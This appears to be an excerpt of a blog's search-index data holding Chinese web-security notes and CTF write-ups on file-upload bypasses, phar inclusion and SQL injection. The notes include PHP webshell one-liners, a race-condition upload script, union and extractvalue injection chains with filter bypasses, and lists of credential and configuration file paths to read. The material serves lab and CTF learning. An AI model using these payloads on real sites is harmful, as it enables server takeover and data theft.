或者././././(256个./)绕过","categories":[{"name":"文件包含","slug":"文件包含","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"文件上传绕过总结","slug":"文件上传绕过总结","date":"2023-01-07T08:12:11.000Z","updated":"2023-01-07T08:14:24.630Z","comments":true,"path":"2023/01/07/文件上传绕过总结/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/","excerpt":"Pass-10（黑名单） 这一关黑名单，最后上传路径直接使用文件名进行拼接，而且只对文件名进行 f i l e n a m e = d e l d o t ( file_name = deldot(file name=deldot(file_name)操作去除文件名末尾的点，构造后缀绕过黑名单 补充知识：deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来 上传zoe.php 然后用bp改后缀加点空格点（即文件名为zoe.php. .）","text":"Pass-10（黑名单） 这一关黑名单，最后上传路径直接使用文件名进行拼接，而且只对文件名进行 f i l e n a m e = d e l d o t ( file_name = deldot(file name=deldot(file_name)操作去除文件名末尾的点，构造后缀绕过黑名单 补充知识：deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来 上传zoe.php 然后用bp改后缀加点空格点（即文件名为zoe.php. .） Pass01JS前端校验: Pass02MIME校验： Pass03黑名单校验不严： 黑名单检测，检测了.php后缀，但未检测php3，phtml等后缀。 Pass04黑名单校验不严： 中间件为Apache的情况下，黑名单未校验htaccess文件，导致可上传htaccess文件，绕过黑名单检测。 以下配置 将后缀为lalala的文件，当成php解析。 &lt;FilesMatch &quot;lalala&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; Pass05黑名单校验不严： 当PHP以CGI／FastCGI模式运行的情况下，黑名单未校验后缀为.ini的文件，导致可上传.user.ini文件，绕过黑名单检测。 详情可以看下乌云的一篇文章 .user.ini 文件官方说明 使用作者提供的phpstudy集成环境是无法利用.user.ini文件，因为不满足利用的三个条件： 服务器脚本语言为PHP 服务器使用CGI／FastCGI模式 上传目录下要有可执行的php文件 其中 第二条不满足,使用的模式不是CGI／FastCGI。第三个条件，作者在upload目录下为我们提供了一个readme.php。 Pass06黑名单校验不严，没有将获取到的后缀名 转换 为小写字母 后再进行判断。黑名单校验不严，后缀大小写绕过。 Pass07黑名单校验不严，导致可结合Windows系统特性 空格 绕过。 黑名单校验不严，后缀加空格绕过. 利用windows 特性(windows文件名后缀不允许存在空格，如果存在，windows自动去除空格)空格绕过。 上传文件名1.php空格 -&gt;php空格不在黑名单内，正常上传-&gt;windows发现写入的文件名有空格，自动去除空格-&gt;最后在磁盘上的文件名 就变成了1.php Pass08黑名单校验不严，导致可结合Windows系统特性点.绕过。 黑名单校验不严，后缀加.绕过. 利用windows特性(windows文件名后缀不允许存在.，如果存在，windows自动去除).绕过。 Pass09黑名单校验不严，导致可结合Windows系统特性::$DATA绕过。利用windows特性::$DATA绕过。DATA是NTFS文件系统的存储数据流的默认属性。 当访问1.php::$DATA时，就是请求1.php本身的数据。 Pass10黑名单校验不严，导致可结合Windows系统特性.绕过 黑名单校验不严，导致php.php. .绕过。 php.php.空格. -&gt; 删除文件名末尾的点,变为php.php.空格-&gt; 首尾去空，变为php.php.-&gt;php.后缀不在黑名单内，绕过黑名单验证-&gt;Windows发现文件名最后有.，自动去除 -&gt; 最终磁盘上的文件名为php.php Pass11黑名单过滤，只过滤一次，因此双写pphphp绕过。 Pass12save_path 保存路径参数可控，Get参数，直接%00 截断，中间件Apache接收到请求后会将%00解码一次，也就变成了空字节,在内存中 一段字符串的结束通常以空字节标识，空字节后面的数据也就被截断了，因此$img_path=../upload/lxhsec.php Pass13save_path 保存路径参数可控，因为是POST参数，在取save_path值的时候，中间件Apache并不会自动解码一次，因此需要自己手动将%00解码一次。 Pass14判断文件内容前两个字节是否是图片前缀。 因此解法1，添加图片前缀，例如gif 前缀 GIF89a 然后利用文件包含 getshell。include.php?file=upload/3620200111182701.gif 解法2，制作图片木马。copy test.png/b+1.php/a 3.png test.png：随便一个png格式图片1.php: 你的php代码3.png: 合并之后的图片 3.png用文本编辑器打开，可以看到1.php的内容： Pass-14~16-图片马Pass-17（二次渲染绕过）这一关对上传图片进行了判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，但是后端二次渲染需要找到渲染后的图片里面没有发生变化的Hex地方，添加一句话，通过文件包含漏洞执行一句话，使用蚁剑进行连接 Pass18条件竞争$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125;&#125; 从源码来看，服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件。 这么看来如果我们还是上传一个图片马的话，网站依旧存在文件包含漏洞我们还是可以进行利用。但是如果没有文件包含漏洞的话，我们就只能上传一个php木马来解析运行了。 那还怎么搞？上传上去就被删除了，我还怎么去访问啊。 不慌不慌，要知道代码执行的过程是需要耗费时间的。如果我们能在上传的一句话被删除之前访问不就成了。这个也就叫做条件竞争上传绕过。 我们可以利用burp多线程发包，然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。 为了更好的演示效果，把一句话木马换一下改为： &lt;?php fputs(fopen(&#x27;Tony.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;Tony&quot;])?&gt;&#x27;);?&gt; 把这个php文件通过burp一直不停的重放，然后再写python脚本去不停的访问我们上传的这个文件，总会有那么一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一个Tony.php的一句话。在正常的渗透测试中这也是个好办法。因为单纯的去访问带有phpinfo()的文件并没有什么效果。一旦删除了还是无法利用。但是这个办法生成的Tony.php服务器是不会删除的，我们就可以通过蚁剑去链接了。 首先，我们上传PHP文件，用BP拦截 进行下一步操作前，这里有个小细节，就是不要把BP的拦截功能关闭了，要一直保持拦截状态以达到测试更好的效果 然后选择Clear$ 没有负载 无限期地重复 然后我们写一个python脚本，通过它来不停的访问我们上传上去的PHP文件(即如上图显示的zoe.php文件) 由于隐私原因，IP地址不能放出来，下面的脚本的url地址XXX都是代表IP地址 import requestsurl = &quot;http://192.168.1.5/upload-labs-master/upload/tiaojian.php&quot;while True: html = requests.get(url) if html.status_code == 200: print(&quot;OK&quot;) break 接下来我们可以在BP点击开始攻击 可以看到上传该文件的数据包不停地在进行重放。 在BP攻击的同时我们也要运行python脚本，目的就是不停地访问jingzheng.php知道成功访问到为止。当出现OK说明访问到了该文件，那么Tony.php应该也创建成功了，用蚁剑连一下试试。 Pass19条件竞争（与18略微不同，大致相同）Pass-20没有对上传的文件做判断，只对用户输入的文件名做判断后缀名黑名单上传的文件名用户可控黑名单用于用户输入的文件后缀名进行判断move_uploaded_file()还有这么一个特性，会忽略掉文件末尾的 /. 所以/.绕过 文件包含知识点 参考文件https://blog.csdn.net/weixin_47598409/article/details/115050869 https://www.jianshu.com/p/55a50c4bf576 https://www.lxhsec.com/2020/01/05/upload-labs-writeup/ https://xz.aliyun.com/t/2435#toc-9","categories":[{"name":"文件上传","slug":"文件上传","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(phar伪协议上传webshell)[NISACTF 2022]bingdundun~","slug":"phar伪协议上传webshell-NISACTF-2022-bingdundun","date":"2023-01-07T08:08:24.000Z","updated":"2023-01-07T08:10:49.677Z","comments":true,"path":"2023/01/07/phar伪协议上传webshell-NISACTF-2022-bingdundun/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/","excerpt":"","text":"点击upload 点了之后发现url地址多了一个bingdundun=upload 应该是上传点 冰墩墩喜欢图片或压缩包，限定了两种文件上传后缀 图片上传发现没啥利用点，试试压缩包 这里补充phar伪协议 主要是用于在php中对压缩文件格式的读取。这种方式通常是用来配合文件上传漏洞使用，或者进行进阶的phar反序列化攻击 用法就是把一句话木马压缩成zip格式，shell.php -&gt; shell.zip，然后再上传到服务器（后续通过前端页面上传也没有问题，通常服务器不会限制上传 zip 文件），再访问：?filename=phar://…/shell.zip/shell.php 写一个一句话木马 然后打包成zip 将zip包上传 利用phar伪协议读取cmd.zip下的cmd.php中的内容 ####这里说一下为什么cmd后面不加php后缀### 输入index,发现都是index.php内容 意外的发现有文件包含漏洞，会自动在后面添加.php 就上网搜索，可以在phar解压的zip压缩包后面加/来访问里面的文件，因为会自动补.php 所以构造payload 所以直接payload：phar://b4a06bf38891ee9d1e4ec9906f157584.zip/cmd 蚁剑连一下","categories":[{"name":"文件上传","slug":"文件上传","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(.user.ini+GIF89a+script一句话木马)[SUCTF 2019]CheckIn","slug":"user-ini-GIF89a-script一句话木马-SUCTF-2019-CheckIn","date":"2023-01-07T08:06:08.000Z","updated":"2023-01-07T08:07:47.216Z","comments":true,"path":"2023/01/07/user-ini-GIF89a-script一句话木马-SUCTF-2019-CheckIn/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/","excerpt":"","text":"1、首先上传了一个php文件给了俩单词 就是不能传这些后缀的文件了 2、那再试试改后缀","categories":[{"name":"文件上传","slug":"文件上传","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(.htaccess+script)[GXYCTF2019]BabyUpload","slug":"htaccess-script-GXYCTF2019-BabyUpload","date":"2023-01-07T08:03:58.000Z","updated":"2023-01-07T08:05:28.835Z","comments":true,"path":"2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/","excerpt":"","text":"1.上传php文件 可见有后缀名过滤 2.上传jpg文件 可见对文件内容为&lt;?可能有过滤 3.上传.htaccess文件 经过分析，是mime类型过滤 将mime类型改为image/jpeg即可 AddType application/x-httpd-php .jpg 这句话的意思是将jpg文件后缀解析为php文件 4.传🐎 5.getshell","categories":[{"name":"文件上传","slug":"文件上传","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"中间件解析漏洞","slug":"中间件解析漏洞","date":"2023-01-07T07:59:49.000Z","updated":"2023-01-07T08:03:07.144Z","comments":true,"path":"2023/01/07/中间件解析漏洞/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","excerpt":"中间件解析漏洞apache解析漏洞","text":"中间件解析漏洞apache解析漏洞 nginx解析漏洞 iis解析漏洞","categories":[{"name":"文件上传","slug":"文件上传","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"常用sql注入判断","slug":"常用sql注入判断","date":"2023-01-07T07:57:41.000Z","updated":"2023-01-07T07:58:31.085Z","comments":true,"path":"2023/01/07/常用sql注入判断/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E5%B8%B8%E7%94%A8sql%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD/","excerpt":"‘ OR 1=1一般SQL代码中会有这么一段SELECT * FROM TABLENAME WHERE ID = 变量，当通过注入后会变成SELECT * FROM TABLENAME WHERE ID = 变量 OR 1=1;就会使WHERE后面的表达式变成一句可有可无的表达式，与SELECT * FROM TABLENAME相等然后就可以通过这种句式来取得当前数据表中所有的用户信息。","text":"‘ OR 1=1一般SQL代码中会有这么一段SELECT * FROM TABLENAME WHERE ID = 变量，当通过注入后会变成SELECT * FROM TABLENAME WHERE ID = 变量 OR 1=1;就会使WHERE后面的表达式变成一句可有可无的表达式，与SELECT * FROM TABLENAME相等然后就可以通过这种句式来取得当前数据表中所有的用户信息。 1）字符型当输入的参数x为字符型时，通常sql语句会这样的 select * from users where id =&#x27;x&#x27; 这种类型我们可以使用and ‘1’=’1 和 and ‘1’=’2来进行测试 www.xxx.com/ccc.php?id=1’ and ‘1’=’1页面正常，继续下一步 www.xxx.com/ccc.php?id=1’ and ‘1’=’2页面报错，则说明存在字符型注入。 原因如下：当输入and ‘1’=‘1的时候，后台执行的语句是 select * from users where id=&#x27;x&#x27; and &#x27;1&#x27;=&#x27;1&#x27; 语法正确，逻辑判断正确，返回正确 当输入and ‘1’=‘2的时候，后台执行的语句是 select * from users where id=&#x27;x&#x27; and &#x27;1&#x27;=&#x27;2&#x27; 语法正确，逻辑判断错误，返回错误 字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。 2）数字型当输入的参数x为整型的时候，通常sql语句是这样的 select * from users where id =x 这种类型可以使用经典的and 1=1 and 1=2来判断 url地址中输入www.xxxx.com/ccc.php?id=x and 1=1页面显示正常，继续下一步 url地址中输入www.xxxx.com/ccc.php?id=x and 1=2页面错误，这说明存在数字型注入。 原因如下：当输入and 1=1时，后台会执行sql语句是 select * from users where id =x and 1=1； 没有语法显示错误且，返回正常 当输入and 1=2时，后台会执行sql语句是 select * from users where id =1 and 1=2; 没有语法错误且，返回错误 我们在使用假设：如果是字符型注入的话，我们输入的语句应该会出现这样的状况 select * from users where id =&#x27;1 and 1=1&#x27;; select * from users where id =&#x27;1 and 1=2&#x27;; 查询语句将and语句全部转换成字符串，并没有进行and的逻辑判断，所以不会出现以上结果，所以这个等式是不成立的。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://alunxzhou.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"SQL报错注入值之extractvalue()、updatexml()、floor()函数","slug":"SQL报错注入值之extractvalue-、updatexml-、floor-函数","date":"2023-01-07T07:51:09.000Z","updated":"2023-01-07T07:56:23.774Z","comments":true,"path":"2023/01/07/SQL报错注入值之extractvalue-、updatexml-、floor-函数/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/","excerpt":"extractvalue()、updatexml()","text":"extractvalue()、updatexml() https://cloud.tencent.com/developer/article/1740429 floor() https://www.freebuf.com/articles/web/257881.html https://www.freebuf.com/column/235496.html","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://alunxzhou.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"Mysql注入中load_file()与select into outfile命令","slug":"Mysql注入中load-file-与select-into-outfile命令","date":"2023-01-07T07:48:29.000Z","updated":"2023-01-07T07:50:12.694Z","comments":true,"path":"2023/01/07/Mysql注入中load-file-与select-into-outfile命令/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/","excerpt":"load_file()查看某个文件的内容","text":"load_file()查看某个文件的内容 看过《SQL Injection with MySQL》的朋友肯定知道用char()函数或者把字符转换成16进制。 注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。 我们构造**$id**为： -1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) “char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。 我们的查询语句就变成： select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) 这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的： “c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加0x 所以上面的语句就变成： select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) 在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用into outfile把文件导出 关于mysql into outfile注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件： 1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。 2、能够使用union （需要mysql 3以上的版本） 3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换） 后天条件需要二个： 1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件） 2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x 也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的 常见用法mysql的load_file()常见的用法： 1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20) 2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32)) 上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。 而无法查看到代码。 3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。 4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache虚拟主机配置文件。 5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统 apache文件。 6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。 7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机 8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径 9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件 10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看 12、/etc/sysconfig/iptables 查看防火墙策略 13、usr/local/app/php5/lib/php.ini PHP的设置 14、/etc/my.cnf Mysql的配置文件 15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码 16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP 17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置 参考https://cloud.tencent.com/developer/article/1918345 select into outfile命令在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上） 但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。 其中，into outfile的使用前提是： 1.要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道 2.要有file权限，默认情况下只有root权限有 3.对目录要有写权限，一般image之类的存放图片的目录有写权限 还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功 select …… into outfile ‘filename’常见的利用方式： 1.直接写进文件里 select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号 2.修改文件结尾 select ‘‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径) 写入内容需要加单引号(不能加双引号) 那么好，现在我们知道了select…… into outfile的利用方法了 首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件 查版本号 蚁剑连接 参考https://www.freebuf.com/articles/web/275874.html https://blog.csdn.net/weixin_44377973/article/details/109265546","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://alunxzhou.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(报错注入)[SWPUCTF 2021 新生赛]error(复现)","slug":"报错注入-SWPUCTF-2021-新生赛-error-复现","date":"2023-01-07T07:44:43.000Z","updated":"2023-01-07T07:47:14.940Z","comments":true,"path":"2023/01/07/报错注入-SWPUCTF-2021-新生赛-error-复现/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"正常输入判断注入点 输入1正常 输入1’ 报错 观察报错点， 1的右边多了一个’ 可能是字符型注入 接着判断 如上可知是字符型注入，属于单引号闭合 接着正常注入流程 判断得知有三个字段 可惜没有报错回显 判断属于无回显字符型报错注入 使用报错函数注入方式 -1’ union select extractvalue(1,concat(0x7e,(select database())))# -1’ union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’test_db’)))# -1’ union select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’test_tb’)))# -1’ union select extractvalue(1,concat(0x7e,(select group_concat(flag) from test_tb)))# 此处涉及到 extractvalue函数 只能输出32位，所以使用mysql中的right函数 -1’ union select extractvalue(1,concat(0x7e,(select group_concat(right(flag,30)) from test_tb)))# 两段flag拼接 NSSCTF{e5b2ff25-eb68-474e-90c6-11bc6591661e}’","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://alunxzhou.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(绕waf)[SWPUCTF 2021 新生赛]sql","slug":"绕waf-SWPUCTF-2021-新生赛-sql","date":"2023-01-07T07:41:50.000Z","updated":"2023-01-07T07:43:56.296Z","comments":true,"path":"2023/01/07/绕waf-SWPUCTF-2021-新生赛-sql/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/","excerpt":"","text":"正常测试 按照标题参数wllm?wllm=1 – 正常?wllm=1’ – 报错?wllm=1’%23 – 正常?wllm=-1’or 1=1%23 – 发现有过滤 测试过滤空格，等号空格=&gt;/**/等号=&gt;like 测试长度?wllm=1’order//by/*/3%23 – 正常?wllm=1’order//by/*/4%23 – 错误– 测试长度为3 测试回显?wlmm=-1’union/****/select/****/1,2,3%23 # 2,3回显位置 查库?wllm=-1’union/****/select/****/1,2,database()%23 # test_db 查表?wllm=-1’union//select/*/1,2,group_concat(table_name)//from/*/information_schema.tables//where/*/table_schema//like/*/‘test_db’%23 – LTLT_flag,users 查列?wllm=-1’union//select/*/1,2,group_concat(column_name)//from/*/information_schema.columns//where/*/table_schema//like/*/‘test_db’%23 – id,flag,id,username 查内容?wllm=-1’union//select/*/1,2,group_concat(flag)//from/*/test_db.LTLT_flag%23 位数长度不足使用截断函数进行绕过，substr，right，REVERSE 被过滤（测试出来的），只能用mid mid截取，因为回显只能有20个，所以20，一组截取?wllm=-1’union//select/*/1,2,mid(group_concat(flag),20,20)//from/*/test_db.LTLT_flag%23 需要读三组NSSCTF{21f84ca4-e37e-48a4-ac36-7787f9901954}","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://alunxzhou.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(load_file&into outfile)云演sql注入基础","slug":"load-file-into-outfile-云演sql注入基础","date":"2023-01-07T07:38:22.000Z","updated":"2023-01-07T07:40:45.911Z","comments":true,"path":"2023/01/07/load-file-into-outfile-云演sql注入基础/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"","text":"随便点开一则新闻 可以看到有注入点 使用and 1=1成功回显 和 and 1=2不回显 判断是整形注入 1.开始查字段 2.报错出注入点 3.查看数据库 4.读取linux的/etc/passwd文件 5.写🐎 6.查看是否写入 7.连接蚁剑 8.拿flag flag{b4dd36207eb58098c458fe9d9498727b}","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://alunxzhou.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"SQL注入bypass","slug":"SQL注入bypass","date":"2023-01-07T07:33:17.000Z","updated":"2023-01-07T07:36:36.188Z","comments":true,"path":"2023/01/07/SQL注入bypass/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/","excerpt":"参考连接[https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%201%201.%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%88%E6%B3%A8%E9%87%8A%E7%AC%A6%20%2F%2A%20%2A%2F%EF%BC%8C%25a0%20%EF%BC%89%EF%BC%9A%202%202.%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%9A,xor%20not%E7%BB%95%E8%BF%87%EF%BC%9A%207%207.%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%EF%BC%88%23%EF%BC%8C--%20%28%E5%90%8E%E9%9D%A2%E8%B7%9F%E4%B8%80%E4%B8%AA%E7%A9%BA%E6%A0%BC%EF%BC%89%EF%BC%89%E8%BF%87%E6%BB%A4%EF%BC%9A%208%208.%3D%E7%BB%95%E8%BF%87%EF%BC%9A%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE](https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL注入绕过技巧 1 1.绕过空格（注释符 %2F* *%2F，%a0 ）： 2 2.括号绕过空格：,xor not绕过： 7 7.绕过注释符号（%23，– (后面跟一个空格））过滤： 8 8.%3D绕过： 更多项目) https://blog.csdn.net/Likhaooo/article/details/122746954 https://blog.csdn.net/huanghelouzi/article/details/82995313","text":"参考连接[https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%201%201.%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%88%E6%B3%A8%E9%87%8A%E7%AC%A6%20%2F%2A%20%2A%2F%EF%BC%8C%25a0%20%EF%BC%89%EF%BC%9A%202%202.%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%9A,xor%20not%E7%BB%95%E8%BF%87%EF%BC%9A%207%207.%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%EF%BC%88%23%EF%BC%8C--%20%28%E5%90%8E%E9%9D%A2%E8%B7%9F%E4%B8%80%E4%B8%AA%E7%A9%BA%E6%A0%BC%EF%BC%89%EF%BC%89%E8%BF%87%E6%BB%A4%EF%BC%9A%208%208.%3D%E7%BB%95%E8%BF%87%EF%BC%9A%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE](https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL注入绕过技巧 1 1.绕过空格（注释符 %2F* *%2F，%a0 ）： 2 2.括号绕过空格：,xor not绕过： 7 7.绕过注释符号（%23，– (后面跟一个空格））过滤： 8 8.%3D绕过： 更多项目) https://blog.csdn.net/Likhaooo/article/details/122746954 https://blog.csdn.net/huanghelouzi/article/details/82995313 